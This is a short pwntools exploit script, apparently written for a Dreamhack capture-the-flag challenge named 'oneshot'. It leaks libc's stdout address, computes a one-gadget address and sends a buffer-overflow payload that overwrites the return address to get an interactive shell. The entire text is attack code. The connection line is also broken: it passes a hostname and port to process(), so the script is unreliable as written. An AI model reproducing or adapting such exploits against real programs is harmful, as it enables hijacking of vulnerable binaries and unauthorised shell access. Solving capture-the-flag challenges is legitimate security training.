from pwn import *

def slog(name, addr): return success(": ".join([name, hex(addr)]))

p = process("host3.dreamhack.games", 9247)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
stdout = int(p.recvuntil('\n')[:-1], 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
og = libc_base + 0x45216

slog("libc base", libc_base)
slog("stdout", stdout)
slog("one gadget", og)

payload = b'A' * 0x18 + p64(0) + b'B' * 0x8 + p64(og)
p.sendafter("MSG: ", payload)

p.interactive()